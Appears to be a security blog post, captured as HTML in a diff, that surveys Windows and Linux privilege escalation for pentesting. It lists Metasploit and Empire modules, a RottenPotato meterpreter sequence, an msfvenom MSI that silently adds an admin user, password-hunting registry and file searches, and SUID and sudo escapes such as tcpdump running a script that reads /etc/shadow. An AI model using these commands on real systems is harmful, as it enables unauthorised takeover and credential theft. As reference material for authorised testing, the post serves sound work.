@@ -1,0 +1,318 @@
+
+<!DOCTYPE html>
+<html lang="default" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>About Privilege Escalation - TyeYeah&#39;s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="TyeYeah, CS,"> 
+    <meta name="description" content="blog on Hexo,Recently I get some time to collect materials about privilege escalation, provide you with useful t,"> 
+    <meta name="author" content="TyeYeah"> 
+    <link rel="alternative" href="atom.xml" title="TyeYeah&#39;s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    <link rel="stylesheet" href="/css/diaspora.css">
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">TyeYeah&#39;s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="../../../.."></a>
+    <div title="Play/Stop" class="iconfont icon-play"></div>
+    <h3 class="subtitle">About Privilege Escalation</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="QR Code" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">About Privilege Escalation</h1>
+        <div class="stuff">
+            <span>February 19, 2021</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/linux/">linux</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pentest/">pentest</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/windows/">windows</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>Recently I get some time to collect materials about privilege escalation, provide you with useful tools and some basic knowledge (overview, not details).</p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>You can refer to <a href="https://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">Windows Privilege Escalation Fundamentals</a>.</p>
+<p>We skip <a href="/2020/03/12/2020-03-12-Domain-Pentest-Intro/#Information-Gathering">Information Gathering</a> part and continue learning other things.</p>
+<h3 id="Kernel-Exploit"><a href="#Kernel-Exploit" class="headerlink" title="Kernel Exploit"></a>Kernel Exploit</h3><p>Tools to search patch vulnerability<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bitsadmin/wesng</span><br><span class="line">https://github.com/ianxtianxt/win-exp-</span><br><span class="line">https://github.com/SecWiki/windows-kernel-exploits</span><br></pre></td></tr></table></figure></p>
+<p>Or<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># query manual</span></span><br><span class="line">&gt; systeminfo</span><br><span class="line">&gt; Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">post/windows/gather/enum_patches</span><br><span class="line">post/multi/recon/local_exploit_suggester</span><br><span class="line"></span><br><span class="line"><span class="comment"># Powershell script</span></span><br><span class="line">&gt; <span class="built_in">Import-Module</span> C:\Sherlock.ps1 (from `https://github.com/rasta-mouse/Sherlock`)</span><br><span class="line">&gt; Find-AllVulns</span><br></pre></td></tr></table></figure></p>
+<p>Or use crafted <code>wmic_info.bat</code><br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f <span class="string">"delims="</span> %%A <span class="keyword">in</span> (<span class="string">'dir /s /b %WINDIR%\system32\*htable.xsl'</span>) <span class="keyword">do</span> set <span class="string">"var=%%A"</span></span><br><span class="line"></span><br><span class="line">wmic <span class="keyword">process</span> get CSName,Description,ExecutablePath,ProcessId /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=<span class="string">'true'</span> get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:<span class="string">"%var%"</span> &gt;&gt; out.html</span><br></pre></td></tr></table></figure></p>
+<p>And some MSF exploits:<br>Windows ClientCopyImage Win32k Exploit</p>
+<ul>
+<li>Windows 7 x64, x86, Windows 2008 R2 SP1 x64</li>
+<li>exploit/windows/local/ms15_051_client_copy_image</li>
+</ul>
+<p>Windows TrackPopupMenu Win32k NULL pointer dereference</p>
+<ul>
+<li>Windows XP SP3, Windows Server 2003 SP2, Windows 7 SP1 Windows Server 2008 32, Windows Server 2008 R2 SP1 64</li>
+<li>exploit/windows/local/ms14_058_track_popup_menu</li>
+</ul>
+<p>KiTrap0D exploit</p>
+<ul>
+<li>Windows Server 2003 32, Windows Server 2008 32, Windows 7 32, Windows XP</li>
+<li>exploit/windows/local/ms10_015_kitrap0d</li>
+</ul>
+<p>Task Scheduler XML escalation</p>
+<ul>
+<li>Windows Vista, Windows 7, Windows Server 2008 x64 and x86</li>
+<li>exploit/windows/local/ms10_092_schelevator</li>
+</ul>
+<p>MS16-016 mrxdav.sys WebDav local escalation</p>
+<ul>
+<li>Windows 7 SP1 x86</li>
+<li>exploit/windows/local/ms16_016_webdav</li>
+</ul>
+<p>EPATHOBJ::pprFlattenRec local escalation</p>
+<ul>
+<li>Windows XP SP3, Windows 2003 SP1, Windows 7 SP1</li>
+<li>exploit/windows/local/ppr_flatten_rec</li>
+</ul>
+<p>MS13-053 : NTUserMessageCall Win32k kernel pool overflow</p>
+<ul>
+<li>Windows 7 SP1 x86</li>
+<li>exploit/windows/local/ms13_053_ schlamperei</li>
+</ul>
+<p>MS16-032 Secondary Logon Handle escalation</p>
+<ul>
+<li>Windows 7-10, 2k8-2k12 32/64, Powershell 2.0 and higher Windows version</li>
+<li>exploit/windows/local/ms16_032_secondary_logon_handle_privesc</li>
+</ul>
+<p><a href="https://github.com/foxglovesec/RottenPotato" target="_blank" rel="noopener">RottenPotato</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; load incognito <span class="comment"># or use incognito</span></span><br><span class="line">meterpreter&gt; list_token -u  <span class="comment"># see any token to use</span></span><br><span class="line">WIN-2HU3N1\Administrator</span><br><span class="line">meterpreter&gt; impersonate_token WIN-2HU3N1\\Administrator</span><br><span class="line"><span class="comment"># or use rotten potato directly</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/foxglovesec/RottenPotato.git</span><br><span class="line">$ <span class="built_in">cd</span> RottenPotato</span><br><span class="line"><span class="comment"># find rottenpotato.exe</span></span><br><span class="line">meterpreter&gt; upload /root/Desktop/RottenPotato/rottenpotato.exe .</span><br><span class="line">meterpreter&gt; execute -Hc -f rottenpotato.exe</span><br><span class="line">meterpreter&gt; impersonate_token <span class="string">"NT AUTHORITY\\SYSTEM"</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="Config-Error"><a href="#Config-Error" class="headerlink" title="Config Error"></a>Config Error</h3><p>This includes system service priv setting error, trusted service path vulns, scheduled tasks.</p>
+<p>Methods to check:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Empire module</span><br><span class="line">privesc/powerup/allchecks</span><br></pre></td></tr></table></figure></p>
+<p>System service privilege config:<br>As services started when booting up are with high privs, if they are exploitable, we can use them to elevate.<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Powershell attack script</span></span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</span><br><span class="line"><span class="comment"># MSF attack module, need a given session</span></span><br><span class="line">exploit/windows/local/service_permissions</span><br></pre></td></tr></table></figure></p>
+<p>Trusted service path vulns:<br>If a service executable path is without <code>&quot;</code> and has <code>&lt;space&gt;</code>, then it is vulnerable.<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Search vulnerable service</span></span><br><span class="line">&gt; wmic service get name,displayname,pathname,startmode | findstr /i <span class="string">"Auto"</span> | findstr /i /v <span class="string">"C:\Windows\\"</span> | findstr /i /v <span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string"># MSF attack module</span></span><br><span class="line"><span class="string">exploit/windows/local/trusted_service_path</span></span><br><span class="line"><span class="string"># Need to migrate, because it disconnect automatically</span></span><br><span class="line"><span class="string">set AutoRunScript migrate -f</span></span><br></pre></td></tr></table></figure></p>
+<p>Scheduled tasks:<br>Since tasks executed by high privileged users, if service dirs are editable, they are vlunerable.<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Check scheduled tasks </span></span><br><span class="line">&gt; schtasks /query /fo LIST /v</span><br><span class="line"><span class="comment"># Check privs of specified dir</span></span><br><span class="line">&gt; accesschk.exe -dqv <span class="string">"D:\test"</span> -accepteula</span><br></pre></td></tr></table></figure></p>
+<h3 id="GPP-Privilege-Escalation"><a href="#GPP-Privilege-Escalation" class="headerlink" title="GPP Privilege Escalation"></a>GPP Privilege Escalation</h3><p>Group Policy Preferences (GPP)<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Powershell obtain cpassword</span></span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</span><br><span class="line"><span class="comment">#MSF</span></span><br><span class="line">post/windows/gather/credentials/gpp</span><br><span class="line"><span class="comment">#Empire</span></span><br><span class="line">usemodule privesc/gpp</span><br></pre></td></tr></table></figure></p>
+<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MSF</span></span><br><span class="line">exploit/windows/local/ask       <span class="comment"># pop up a window, click to get system</span></span><br><span class="line">exploit/windows/local/bypassuac</span><br><span class="line">exploit/windows/local/bypassuac_injection</span><br><span class="line">exploit/windows/local/bypassuac_fodhelper</span><br><span class="line">exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">exploit/windows/local/bypassuac_comhijack</span><br><span class="line"><span class="comment">#Powershell</span></span><br><span class="line">https://github.com/samratashok/nishang/blob/master/Escalation/Invoke-PsUACme.ps1</span><br><span class="line"><span class="comment">#Empire</span></span><br><span class="line">usemodule privesc/bypassuac</span><br><span class="line">usemodule privesc/bypassuac_wscript</span><br></pre></td></tr></table></figure>
+<h3 id="Token-Stealing"><a href="#Token-Stealing" class="headerlink" title="Token Stealing"></a>Token Stealing</h3><p>Use <a href="https://github.com/foxglovesec/RottenPotato" target="_blank" rel="noopener">RottenPotato</a>.</p>
+<h3 id="Without-Token"><a href="#Without-Token" class="headerlink" title="Without Token"></a>Without Token</h3><p>Use <a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">Responder.py</a></p>
+<h3 id="For-Different-OS-Version"><a href="#For-Different-OS-Version" class="headerlink" title="For Different OS Version"></a>For Different OS Version</h3><ol>
+<li><p>Windows2000/2003, XP<br>Use <code>at</code>(set scheduled tasks) to let users in <code>Administrator</code> group elevated to <code>SYSTEM</code> </p>
+</li>
+<li><p>Windows 7/8, 03/08, 12/16</p>
+</li>
+</ol>
+<ul>
+<li><p><code>sc</code> to control service</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; sc Create syscmd binPath= <span class="string">"cmd /K start"</span> type= own type= interact</span><br><span class="line">&gt; sc start systcmd</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>AlwaysInstallElevated: allow non-admin users run <code>*.msi</code> to install with <code>SYSTEM</code> privs</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># disabled by default</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:<span class="number">00000001</span></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:<span class="number">00000001</span></span><br><span class="line"><span class="comment"># check using</span></span><br><span class="line">C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">C:&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br><span class="line"><span class="comment"># if not vulnerable</span></span><br><span class="line">ERROR: The system was unable to find the specified registry key or value.</span><br><span class="line"><span class="comment"># else it prints key values</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># attack</span></span><br><span class="line">&gt; msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msi</span><br><span class="line">&gt; msiexec /quiet /qn /i C:\programdata\rotten.msi</span><br><span class="line"><span class="comment"># /quiet    forbid sending messages to user when installing</span></span><br><span class="line"><span class="comment"># /qn       no GUI</span></span><br><span class="line"><span class="comment"># /i        specify the program</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">exploit/windows/local/always_install_elevated</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Unattended Installs: a XML file named Unattended, contains all configs about program installation, like account config<br>They are under dirs:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Panther\</span><br><span class="line">C:\Windows\Panther\Unattend\</span><br><span class="line">C:\Windows\System32\</span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>Except <code>Unattend.xml</code>, the <code>sysprep.xml</code> and <code>sysprep.inf</code> are also contains something<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; dir C:*vnc.ini /s /b /c</span><br><span class="line">&gt; dir C:\ /s /b /c | findstr /sr *password*</span><br><span class="line">&gt; findstr /si password *.txt | *.xml | *.ini</span><br><span class="line">&gt; reg query HKLM /f password /t REG_SZ /s</span><br><span class="line">&gt; reg query HKCU /f password /t REG_SZ /s</span><br><span class="line"><span class="comment"># MSF module</span></span><br><span class="line">post/windows/gather/enum_unattend</span><br></pre></td></tr></table></figure></p>
+<ol start="3">
+<li>CVE</li>
+</ol>
+<ul>
+<li>Windows10      CVE-2020-0796 </li>
+<li>Windows7/2008  CVE-2018-8120 </li>
+<li>Windows7/8、2008/2012/2016     CVE-2017-0213 </li>
+<li>SQL Server, IIS (just for local, not domain) <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075" target="_blank" rel="noopener">MS16-075(RottenPotato)</a></li>
+</ul>
+<h3 id="Other-Methods"><a href="#Other-Methods" class="headerlink" title="Other Methods"></a>Other Methods</h3><p>For there are toooo much knowledge to mention, maybe it’s better to google just when you need them.</p>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>The info gathering part is related to <a href="/2019/05/07/2019-05-07-Linux-Security-Response/">Linux Security Response</a>. Here recommends some tools: </p>
+<ul>
+<li><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a></li>
+<li><a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener">pspy - unprivileged Linux process snooping</a></li>
+<li><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check" target="_blank" rel="noopener">unix-privesc-check</a></li>
+<li><a href="https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py" target="_blank" rel="noopener">Linprivchecker.py</a></li>
+</ul>
+<h3 id="Kernel-Exploit-1"><a href="#Kernel-Exploit-1" class="headerlink" title="Kernel Exploit"></a>Kernel Exploit</h3><p>Normally we should have:</p>
+<ol>
+<li>vulnerable kernel</li>
+<li>corresponding exploit program</li>
+<li>able to transfer exploit to the target</li>
+<li>able to run it, and let kernel run our payload</li>
+</ol>
+<p>Search exploits by<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:exploit-db.com kernel version python linprivchecker.py extended</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://www.exploit-db.com/exploits/40839" target="_blank" rel="noopener">DirtyCow</a> is a typical vulnerability to perform privilege escalation, which can handle many kernel versions: <a href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs" target="_blank" rel="noopener">PoCs</a></p>
+<p>More exploit can be found at <a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">linux-kernel-exploits</a>, but it is not recommended, because after that computer may be unstable and easy to crash. </p>
+<h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><p>This part can refer to <a href="https://pentestlab.blog/2017/09/25/suid-executables/" target="_blank" rel="noopener">SUID Executables</a> by <a href="https://pentestlab.blog/" target="_blank" rel="noopener">penetration testing lab</a>. </p>
+<p>Other methods:</p>
+<ul>
+<li>Use <code>cp</code> to overwrite <code>/etc/shadow</code></li>
+<li>Use <code>mv</code> to overwrite <code>/etc/shadow</code>, <code>/etc/sudoers</code></li>
+<li><code>awk</code>: <code>awk &#39;BEGIN {system(&quot;/bin/bash&quot;)}&#39;</code></li>
+<li><code>man</code>: <ul>
+<li><code>man passwd</code></li>
+<li><code>!/bin/bash</code></li>
+</ul>
+</li>
+<li><code>python</code>/<code>perl</code>/<code>ruby</code>/<code>lua</code>/etc<ul>
+<li>refer to <a href="/2020/03/31/2020-03-31-About-Reverse-Shell/">About Reverse Shell</a></li>
+</ul>
+</li>
+<li><code>tcpdump</code><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> $<span class="string">'id\ncat /etc/shadow'</span> &gt; /tmp/.<span class="built_in">test</span></span><br><span class="line">$ chmod +x /tmp/.<span class="built_in">test</span></span><br><span class="line">$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.<span class="built_in">test</span> -Z root</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>A cheat sheet for <code>Linux</code> privilege escalation is <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a>.</p>
+<p>echo ‘import os,stat ;os.chmod(“/etc/passwd”, stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)’ &gt;&gt; test.py</p>
+<h3 id="SUDO"><a href="#SUDO" class="headerlink" title="SUDO"></a>SUDO</h3><p>The <code>sudo</code> command is to let normal user execute one command as <code>root</code> user, and the configurations are stored in <code>/etc/sudoers</code>.</p>
+<p>Format of <code>/etc/sudoers</code> should be like<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root ALL=(ALL) ALL</span><br><span class="line"># let `root` user on `ALL(1)` terminal to be as `ALL(1)` user to execute `ALL(3)` commands</span><br><span class="line">attacker ALL=(ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure></p>
+<p>Use <code>sudo -l</code> to list all allowed commands, the exploit methods are similar to <code>SUID</code>.</p>
+<h3 id="Cronjob"><a href="#Cronjob" class="headerlink" title="Cronjob"></a>Cronjob</h3><p>Since the crontab tasks are executed by <code>root</code> user, if any config file is editable by normal users, you can let root user execute anything you want. </p>
+<p>To sum up, the <code>SUID</code>, <code>SUDO</code> and Cron jobs all depends on writing things by normal user and being executed by <code>root</code> user</p>
+<h3 id="in-PATH"><a href="#in-PATH" class="headerlink" title=". in $PATH"></a><code>.</code> in $PATH</h3><p>We always run binary in current dir with <code>./binary</code>, while if we add <code>.</code> in <code>$PATH</code> we can run <code>binary</code> directly.</p>
+<p>However if attackers make an evil <code>ls</code> or <code>cat</code> or something, and lure <code>root</code> user to enter that dir and execute, it is attacked.</p>
+<h2 id="Other-Useful-Tools"><a href="#Other-Useful-Tools" class="headerlink" title="Other Useful Tools"></a>Other Useful Tools</h2><p><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a> and <a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">Linux_Exploit_Suggester</a> (quite old).</p>
+<p><a href="https://github.com/mzfr/gtfo" target="_blank" rel="noopener">gtfo</a> which searches the <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a> (for <code>linux</code>) and <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a> (for <code>windows</code>) in <code>Python 3</code>, using system commands to elevate.</p>
+<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">PEASS - Privilege Escalation Awesome Scripts SUITE</a> also provides exploit for both <code>linux</code> and <code>windows</code>.</p>
+<p>A pack for <a href="https://github.com/lyshark/Windows-exploits" target="_blank" rel="noopener">Windows-exploits</a></p>
+<p>Besides there are <a href="https://github.com/AlessandroZ/BeRoot" target="_blank" rel="noopener">BeRoot</a> to find config errors, <a href="https://github.com/vulmon/Vulmap" target="_blank" rel="noopener">Vulmap</a> and <a href="https://github.com/chroblert/WindowsVulnScan" target="_blank" rel="noopener">WindowsVulnScan</a> to scan vulns.</p>
+<p>Online searching includes (in Chinese):</p>
+<ul>
+<li><a href="https://detect.secwx.com/" target="_blank" rel="noopener">https://detect.secwx.com/</a></li>
+<li><a href="http://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">http://bugs.hacking8.com/tiquan/</a></li>
+</ul>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="https://link.hhtjim.com/163/514216257.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="https://link.hhtjim.com/163/514213582.mp3"></li>
+                        
+                    
+                        
+                            <li title="2" data-url="https://link.hhtjim.com/163/514216237.mp3"></li>
+                        
+                    
+                        
+                            <li title="3" data-url="https://link.hhtjim.com/163/36664350.mp3"></li>
+                        
+                    
+                        
+                            <li title="4" data-url="https://link.hhtjim.com/163/401722197.mp3"></li>
+                        
+                    
+                        
+                            <li title="5" data-url="https://link.hhtjim.com/163/34228815.mp3"></li>
+                        
+                    
+                        
+                            <li title="6" data-url="https://link.hhtjim.com/163/401723178.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-enable="false" data-ae="false" data-ci data-cs data-r data-o data-a data-d="false">View Comments</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">1.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-Exploit"><span class="toc-number">1.1.</span> <span class="toc-text">Kernel Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Config-Error"><span class="toc-number">1.2.</span> <span class="toc-text">Config Error</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPP-Privilege-Escalation"><span class="toc-number">1.3.</span> <span class="toc-text">GPP Privilege Escalation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-UAC"><span class="toc-number">1.4.</span> <span class="toc-text">Bypass UAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token-Stealing"><span class="toc-number">1.5.</span> <span class="toc-text">Token Stealing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Without-Token"><span class="toc-number">1.6.</span> <span class="toc-text">Without Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#For-Different-OS-Version"><span class="toc-number">1.7.</span> <span class="toc-text">For Different OS Version</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Other-Methods"><span class="toc-number">1.8.</span> <span class="toc-text">Other Methods</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">2.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kernel-Exploit-1"><span class="toc-number">2.1.</span> <span class="toc-text">Kernel Exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUID"><span class="toc-number">2.2.</span> <span class="toc-text">SUID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUDO"><span class="toc-number">2.3.</span> <span class="toc-text">SUDO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cronjob"><span class="toc-number">2.4.</span> <span class="toc-text">Cronjob</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#in-PATH"><span class="toc-number">2.5.</span> <span class="toc-text">. in $PATH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Other-Useful-Tools"><span class="toc-number">3.</span> <span class="toc-text">Other Useful Tools</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
